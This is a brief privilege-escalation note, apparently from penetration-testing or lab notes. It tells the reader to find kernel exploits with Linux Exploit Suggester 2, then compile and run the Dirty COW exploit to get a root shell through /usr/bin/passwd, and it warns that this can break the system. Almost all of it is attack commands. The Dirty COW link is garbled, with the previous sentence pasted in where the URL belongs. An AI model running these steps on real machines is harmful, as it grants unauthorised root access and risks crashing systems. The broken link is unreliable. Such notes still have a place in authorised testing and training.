**Can break the system only run as last resort**

Identify potential kernel exploits on the current system using [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2): `perl linux-exploit-suggester-2.pl`

### Dirty COW

1. Compile the [Dirty COW](<Identify potential kernel exploits on the current system using [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2): `perl linux-exploit-suggester-2.pl`>) code: `gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w`
2. Run it: `./c0w`
3. Gain the shell: `/usr/bin/passwd`
